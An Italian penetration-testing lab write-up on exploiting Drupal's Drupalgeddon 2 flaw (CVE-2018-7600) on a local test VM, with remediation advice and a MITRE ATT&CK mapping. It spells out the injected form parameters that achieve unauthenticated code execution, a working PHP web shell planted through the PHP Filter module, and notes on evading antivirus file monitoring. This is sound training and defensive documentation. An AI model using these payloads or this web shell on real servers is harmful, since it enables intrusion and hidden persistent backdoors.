> [English](README.en.md) | **Italiano**

# Drupal Core Remote Code Execution (Drupalgeddon 2)

> - **Fase:** Web Attack - CMS Exploitation
> - **Visibilita:** Media - richieste HTTP POST con payload verso form Drupal, rilevabile ma spesso non bloccato da WAF generici
> - **Prerequisiti:** Istanza Drupal versione 6.x, 7.x (< 7.58) o 8.x (< 8.3.9) identificata, connessione di rete al target
> - **Output:** Remote Code Execution non autenticata, accesso dashboard admin Drupal, deploy Web Shell PHP, controllo server, finding WEB-015

---

**ID Finding:** `WEB-015` | **Severity:** `Critico` | **CVSS v3.1:** 9.8

---

## 1 Executive Summary

Durante l'attività di Penetration Testing condotta sull'ambiente di test Windows 10, è stata identificata e sfruttata con successo una vulnerabilità critica nell'istanza del CMS Drupal (versione 7.54).

La vulnerabilità, nota come Drupalgeddon 2 (CVE-2018-7600), risiede in una mancata sanitizzazione degli input nel sottosistema Form API di Drupal.

Questa falla ha permesso l'esecuzione di codice arbitrario remoto (RCE) senza autenticazione. Nonostante la presenza di protezioni endpoint (Windows Defender) che hanno bloccato i tentativi di reverse shell automatizzati, è stato possibile ottenere la persistenza e il controllo del sistema sfruttando le funzionalità native del CMS per iniettare una Web Shell PHP.

L'exploit ha garantito il controllo del server con i privilegi dell'utente che esegue il servizio web, esponendo l'intera infrastruttura a rischi di esfiltrazione dati e compromissione totale.

CVSS Score: 9.8 (Critical)

---

## 2 Technical Analysis

#### 1. Reconnaissance & Fingerprinting

La fase iniziale di ricognizione ha permesso di identificare la versione specifica di Drupal in uso.

Analizzando i file pubblici accessibili (es. `CHANGELOG.txt`) o gli header HTTP, è stato confermato che il target esegue una versione obsoleta e vulnerabile.

Evidence:

Lo screenshot seguente mostra l'identificazione della versione (es. 7.54) tramite analisi del file `CHANGELOG.txt`.

![](./img/Screenshot_2026-02-16_17_55_22.jpg)

#### 2. Exploitation (CVE-2018-7600)

La vulnerabilità sfrutta la gestione delle richieste AJAX nei form (Form API). Manipolando i parametri `#post_render`, è possibile indurre il CMS a eseguire funzioni PHP arbitrarie.

Vettore d'Attacco:

- Metodologia: Exploitation Manuale (Bypass di controlli automatici/AV).
- Tecnica: Injection di array malevoli tramite richieste POST costruite ad-hoc.
- Payload: Esecuzione di comandi di sistema (`passthru`, `exec`) tramite curl e successiva creazione di una backdoor.

Esecuzione:

Inizialmente sono stati tentati exploit automatici, bloccati dalle policy di sicurezza dell'host Windows. È stato quindi eseguito un attacco manuale inviando un payload specifico per verificare l'esecuzione di codice (`RCE verification`).

#### 3. Post-Exploitation & Persistence

Una volta confermata la vulnerabilità, l'accesso è stato consolidato trasformando l'RCE in una Web Shell persistente.

- Privilege Escalation / Accesso Amministrativo: È stato ottenuto l'accesso alla dashboard di amministrazione di Drupal (bypassando l'autenticazione o resettando la password tramite RCE).
- Abilitazione Modulo Vulnerabile: È stato attivato il modulo core "PHP Filter", che consente l'esecuzione di codice PHP all'interno dei nodi di contenuto.
- Deploy della Web Shell: È stata creata una pagina dissimulata denominata "system diagnostyc". All'interno del corpo della pagina è stato iniettato un payload PHP (`<?php system("ipconfig"); ?>`) configurando il formato di testo come "PHP code".

Evidence:

Lo screenshot seguente documenta il successo dell'operazione. È visibile la pagina creata sul CMS che restituisce l'output del comando di sistema `ipconfig` direttamente dal server Windows sottostante, confermando il controllo totale dell'infrastruttura di rete e dell'utente di sistema.

![](./img/Screenshot_2026-02-16_18_14_49.jpg)

---

## 3 Business Impact

L'impatto di questa vulnerabilità è classificato come CRITICO per i seguenti motivi:

- Confidenzialità (Totale Perdita): L'attaccante ha accesso completo al database di Drupal (contenente credenziali utente, dati clienti) e ai file del server Windows.
- Integrità (Totale Perdita): È possibile modificare il contenuto del sito (Defacement), inserire backdoor persistenti o alterare i dati nel database.
- Disponibilità: L'attaccante può cancellare file critici, arrestare il servizio web o cifrare i dati a scopo di estorsione (Ransomware).

Poiché l'attacco non richiede autenticazione, il sito è esposto a qualsiasi attore malevolo su internet o nella rete locale.

---

## 4 Remediation Plan

Si raccomanda di applicare le seguenti azioni correttive con urgenza immediata:

- Patching (Priorità Alta):
    
    Aggiornare immediatamente il core di Drupal alle versioni sicure:

    - Se 7.x: Aggiornare a 7.58 o superiore.
    - Se 8.x: Aggiornare a 8.3.9, 8.4.6, 8.5.1 o superiori.

- Web Application Firewall (WAF):
    
    Implementare regole WAF per bloccare richieste contenenti parametri sospetti come `#post_render`, `#markup` o tentativi di invocazione di funzioni come `passthru` o `exec`.

- Hardening del Server:

    - Disabilitare funzioni PHP pericolose nel file `php.ini` (es. `disable_functions = exec,passthru,shell_exec,system`).
    - Disabilitare il modulo "PHP Filter" se non strettamente necessario.
    - Rimuovere file non necessari come `CHANGELOG.txt` o `INSTALL.txt` dalla root del sito per complicare il fingerprinting.

---

## Analisi a Basso Livello: Meccanica di Drupalgeddon 2

### Form API Rendering Pipeline

CVE-2018-7600 sfrutta il modo in cui Drupal processa i form attraverso il suo Form API. La vulnerabilita risiede nel sottosistema di rendering AJAX:

```
Flusso normale di un form Drupal:
1. Browser invia POST con parametri del form
2. Drupal Form API valida i campi
3. Se AJAX request: il server renderizza solo l'elemento richiesto
4. Il rendering usa le "render arrays" (#type, #markup, #post_render)

Flusso dell'exploit:
1. Attaccante invia POST con render array iniettato:
   mail[#post_render][] = exec
   mail[#type] = markup
   mail[#markup] = "id"         <- comando arbitrario

2. Drupal processa il parametro "mail" come render array
3. Il callback #post_render viene invocato DOPO il rendering
4. exec("id") viene eseguito con i privilegi del web server

Perche funziona:
- Drupal NON distingue tra parametri di form e render array properties
- I caratteri "#" nei nomi dei parametri indicano proprieta interne
- L'attaccante puo iniettare proprieta di rendering tramite parametri POST
- #post_render accetta callable PHP (exec, passthru, system)
```

### PHP Filter Module: Persistenza Nativa

Il modulo "PHP Filter" e un componente core di Drupal (disabilitato per default dalla versione 8) che permette di inserire codice PHP nei nodi di contenuto:

```
Deploy Web Shell via PHP Filter:

1. Admin -> Modules -> Abilita "PHP Filter"
2. Content -> Add content -> Basic page
3. Text format: "PHP code" (dropdown)
4. Body: <?php if(isset($_GET['c'])){echo system($_GET['c']);} ?>
5. Salva come pagina pubblica

Accesso web shell:
http://target/node/123?c=whoami
-> www-data

Vantaggi per l'attaccante:
- La web shell e un "nodo" Drupal legittimo (sopravvive agli aggiornamenti)
- Non modifica file su disco (elude file integrity monitoring)
- Il codice PHP e nel database, non nel filesystem
- Appare come una pagina normale nel CMS
```

### Drupal vs WordPress: Confronto Superficie di Attacco

| Aspetto | WordPress | Drupal |
| :--- | :--- | :--- |
| Versioning esposto | `readme.html`, meta generator | `CHANGELOG.txt`, `INSTALL.txt` |
| Plugin path | `/wp-content/plugins/` | `/sites/all/modules/`, `/modules/` |
| Admin panel | `/wp-admin/` (nascondibile) | `/user/login` (non nascondibile) |
| RCE post-auth | Theme Editor (PHP diretto) | PHP Filter module (nel database) |
| API REST | `/wp-json/` (dalla 4.7) | `/jsonapi/` (dalla 8.x) |
| Scanner dedicato | WPScan | Droopescan |

---

## Esperienza di Laboratorio

Il tentativo iniziale con exploit automatici (Metasploit `drupal_drupalgeddon2`) e stato bloccato da Windows Defender sulla macchina target. Questo ha forzato il passaggio all'exploitation manuale via curl, che si e rivelata piu formativa: costruire il payload POST a mano ha richiesto di comprendere la meccanica del Form API render array, non solo di lanciare un modulo preconfigurato.

La scelta di usare il PHP Filter module per la persistenza invece di scrivere un file PHP su disco e stata dettata dalla necessita: Windows Defender monitorava le scritture nella webroot ma non il contenuto del database Drupal. Questo ha evidenziato una lacuna comune nelle difese: gli antivirus controllano il filesystem ma non il database, dove il codice PHP viene memorizzato come testo nel campo `body_value` della tabella `node__body`.

L'output di `ipconfig` tramite la web shell ha confermato che il server girava su Windows con interfaccia di rete configurata in DHCP, informazione utile per il lateral movement. In un engagement reale, il passo successivo sarebbe stato l'upload di un agent C2 (Covenant, Sliver) per ottenere una shell interattiva e procedere con il pivoting nella rete interna.

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Reconnaissance | Active Scanning: Vulnerability Scanning | `T1595.002` | Fingerprinting della versione Drupal 7.54 tramite accesso al file `CHANGELOG.txt` pubblico e identificazione della vulnerabilita CVE-2018-7600 (WEB-015) |
| Initial Access | Exploit Public-Facing Application | `T1190` | Exploitation manuale di CVE-2018-7600 tramite manipolazione dei parametri `#post_render` nel Form API di Drupal per ottenere RCE non autenticata (WEB-015) |
| Persistence | Server Software Component: Web Shell | `T1505.003` | Deploy di Web Shell PHP attraverso il modulo "PHP Filter" di Drupal, creando una pagina "system diagnostyc" che esegue comandi di sistema (WEB-015) |
| Discovery | File and Directory Discovery | `T1083` | Esecuzione del comando `ipconfig` tramite Web Shell per mappare la configurazione di rete del server Windows sottostante (WEB-015) |

---

> **Nota:** Il finding WEB-015 e stato documentato su un'istanza Drupal 7.54 installata in locale
> su una macchina virtuale Windows 10, configurata come ambiente di test per scopi didattici.
> CVE-2018-7600 e una vulnerabilita di alto profilo del 2018 (Drupalgeddon2) con patch disponibili
> da marzo 2018. Qualsiasi istanza Drupal non aggiornata alla versione 7.58 o superiore in
> ambienti di produzione rappresenta un rischio critico immediato.
